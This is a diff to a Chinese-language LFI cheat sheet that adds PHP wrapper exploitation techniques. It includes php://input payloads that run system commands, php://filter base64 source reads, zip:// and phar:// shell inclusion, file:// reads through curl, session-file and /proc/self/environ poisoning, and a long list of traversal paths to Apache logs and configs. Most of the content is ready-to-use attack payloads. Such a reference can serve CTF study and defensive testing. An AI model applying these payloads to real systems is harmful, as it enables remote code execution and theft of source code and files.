@@ -204,18 +204,46 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxp
 PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
 ```
 
-* ** php://input ** -- php的输入流，可以读到没有处理过的POST数据
+* ** php://input ** -- 
+
+可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)
 
 >  php5.0以下 和 php5.2 版本有效, allow_url_include=On
 
-
-# firefox hackbar
+LFI 导致 code excute
 
 ```
-?page=php://input
+<?php 
+　　@eval(file_get_contents('php://input'))
+?> 
+http://localhost/test/index.php
+post: system("dir");
+result: list directory
+```
 
-post:
-<?php system('ls');?>
+这本质上远程文件包含的利用，远程文件包含中的include接收的是一个"资源定位符"，在大多数情况下这是一个磁盘文件路径，但是从流的角度来看，这也可以是一个流资源定位符，即我们将include待包含的资源又重定向到了输入流中，从而可以输入我们的任意code到include中
+
+```
+<?php
+　　@include($_GET["file"]);
+?>
+http://localhost/test/index.php?file=php://input
+post: <?php system('ipconfig');?>
+result: ip information
+```
+
+有一点要注意:
+
+```
+<?php echo file_get_contents("solution.php");?>
+```
+
+在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了
+
+解决这个问题的方法就是使用base64_encode进行编码
+
+```
+<?php echo base64_encode(file_get_contents("solution.php"));?>
 ```
 
 * ** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
@@ -234,9 +262,41 @@ post:
 $ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt
 ```
 
+向磁盘写文件
+
+```
+<?php
+　　/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
+　　然后写入当前目录下的 example.txt */
+　　file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");
+?>
+```
+
+这个参数采用一个或以管道符 | 分隔的多个过滤器名称
+
 * ** php://fd **
 
 > php 5.3.6中新增加
+
+* zip://
+
+```
+# %23 --> #, 截断
+?f=zip://archive.zip%23dir/file.txt 
+```
+
+文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩
+```
+zip -0 1.zip shell.php
+```
+
+* phar://
+
+```
+?f=phar://php.zip/php.jpg
+```
+
+与zip协议区别就是 phar 是用/来分隔而不是 #
 
 * ** glob **
 
@@ -244,6 +304,89 @@ $ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://f
 
 ```
 DirectoryIterator(“glob://ext/spl/examples/*.php”)
+```
+
+```
+<?php
+　　// 循环 ext/spl/examples/ 目录里所有 *.php 文件
+　　// 并打印文件名和文件尺寸
+　　$it = new DirectoryIterator("glob://E:\\wamp\\www\\test\\*.php");
+　　foreach($it as $f) 
+　　{
+　　　　printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
+　　}
+?>
+```
+
+* file://
+
+越权访问本地文件
+
+file:// — 访问本地文件系统; 文件系统是PHP使用的默认封装协议，展现了本地文件系统
+
+```
+<?php
+　　$res = file_get_contents("file://E://wamp//www//test//solution.php");
+　　var_dump($res);
+?>
+```
+
+file://这个伪协议可以展示"本地文件系统"，当存在某个用户可控制、并得以访问执行的输入点时，我们可以尝试输入file://去试图获取本地磁盘文件
+
+http://www.wechall.net/challenge/crappyshare/index.php
+
+http://www.wechall.net/challenge/crappyshare/crappyshare.php
+
+在这题CTF中，攻击的关键点在于：curl_exec($ch)
+
+```
+function upload_please_by_url($url)
+{ 
+　　if (1 === preg_match('#^[a-z]{3,5}://#', $url)) # Is URL? 
+　　{
+　　　　$ch = curl_init($url);
+　　　　curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+　　　　curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+　　　　curl_setopt($ch, CURLOPT_FAILONERROR, true);
+　　　　if (false === ($file_data = curl_exec($ch)))
+　　　　{
+　　　　　　htmlDisplayError('cURL failed.');
+　　　　}
+　　　　else
+　　　　{
+　　　　　　// Thanks
+　　　　　　upload_please_thx($file_data);
+　　　　}
+　　}
+　　else
+　　{
+　　　　htmlDisplayError('Your URL looks errorneous.');
+　　}
+}
+```
+
+当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的
+
+## 包含Session文件
+
+包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。
+
+```
+x|s:19:"<?php phpinfo(); ?>"
+```
+
+PHP默认生成的Session文件往往存放在/tmp目录下
+
+```
+/tmp/sess_SESSIONID
+```
+
+## 包含/proc/self/environ文件
+
+包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容
+
+```
+http://192.168.159.128/index.php?file=../../../../../../../proc/self/environ
 ```
 
 ## 日记包含高级利用
@@ -283,51 +426,61 @@ Host: 192.168.3.44
 
 你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！
 
+* conf file paths targeted by LFI
+
+```
+/etc/apache2/httpd.conf
+/etc/httpd/httpd.conf
+
+```
+
 * Popular log file paths targeted by LFI
 
 ```
-1. /etc/httpd/logs/access.log
-2. /etc/httpd/logs/access_log
-3. /etc/httpd/logs/error.log
-4. /etc/httpd/logs/error_log
-5. /opt/lampp/logs/access_log
-6. /usr/local/apache/log
-7. /usr/local/apache/logs/access.log
-8. /usr/local/apache/logs/error.log
-9. /usr/local/etc/httpd/logs/access_log
-10. /usr/local/www/logs/thttpd_log
-11. /var/apache/logs/error_log
-12. /var/log/apache/error.log
-13. /var/log/apache-ssl/error.log
-14. /var/log/httpd/error_log
-15. /var/log/httpsd/ssl_log
-16. /var/www/log/access_log
-17. /var/www/logs/access.log
-18. /var/www/logs/error.log
+../apache/logs/error.log
+../apache/logs/access.log
+../../apache/logs/error.log
+../../apache/logs/access.log
+../../../apache/logs/error.log
+../../../apache/logs/access.log
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../var/www/logs/access_log
+../../../../../../../var/www/logs/access.log
+../../../../../../../usr/local/apache/logs/access_ log
+../../../../../../../usr/local/apache/logs/access. log
+../../../../../../../var/log/apache/access_log
+../../../../../../../var/log/apache2/access_log
+../../../../../../../var/log/apache/access.log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/access_log
+../../../../../../../var/log/access.log
+../../../../../../../var/www/logs/error_log
+../../../../../../../var/www/logs/error.log
+../../../../../../../usr/local/apache/logs/error_l og
+../../../../../../../usr/local/apache/logs/error.l og
+../../../../../../../var/log/apache/error_log
+../../../../../../../var/log/apache2/error_log
+../../../../../../../var/log/apache/error.log
+../../../../../../../var/log/apache2/error.log
+../../../../../../../var/log/error_log
+../../../../../../../var/log/error.log
+
 19. C:\apache\logs\access.log
 20. C:\Program Files\Apache Group\Apache\logs\access.log
 21. C:\program files\wamp\apache2\logs
 22. C:\wamp\logs
 23. C:\xampp\apache\logs\error.log
-24. /opt/lampp/logs/error_log
-25. /usr/local/apache/logs
-26. /usr/local/apache/logs/access_log
-27. /usr/local/apache/logs/error_log
-28. /usr/local/etc/httpd/logs/error_log
-29. /var/apache/logs/access_log
-30. /var/log/apache/access.log
-31. /var/log/apache-ssl/access.log
-32. /var/log/httpd/access_log
-33. /var/log/httpsd/ssl.access_log
-34. /var/log/thttpd_log
-35. /var/www/log/error_log
-36. /var/www/logs/access_log
-37. /var/www/logs/error_log
+
 38. C:\apache\logs\error.log
 39. C:\Program Files\Apache Group\Apache\logs\error.log
 40. C:\wamp\apache2\logs
 41. C:\xampp\apache\logs\access.log
-42. proc/self/environ
+
 ```
 
 [3]: http://www.wooyun.org/bugs/wooyun-2011-02236
